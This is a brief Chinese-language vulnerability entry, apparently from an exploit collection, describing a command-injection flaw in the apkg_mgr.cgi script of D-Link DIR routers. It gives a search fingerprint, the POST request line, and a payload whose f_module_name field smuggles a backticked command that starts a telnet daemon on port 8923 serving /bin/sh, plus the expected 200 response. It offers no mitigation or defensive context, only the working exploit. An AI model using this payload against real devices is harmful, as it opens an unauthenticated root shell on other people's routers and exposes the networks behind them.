# D-Linkapkg_mgr.cgi存在命令执行漏洞

D-Linkapkg_mgr.cgi ｜ 命令执行 ｜ —
- **指纹**：`"D-Link-DIR"`
- **请求**：`POST /cgi-bin/apkg\_mgr.cgi HTTP/1.1`

**Payload**
```
cmd=module\_enable\_disable\&f\_module\_name=`utelnetd -p 8923 -l /bin/sh`\&f\_enable=\&f\_web=
```
- **响应特征**：200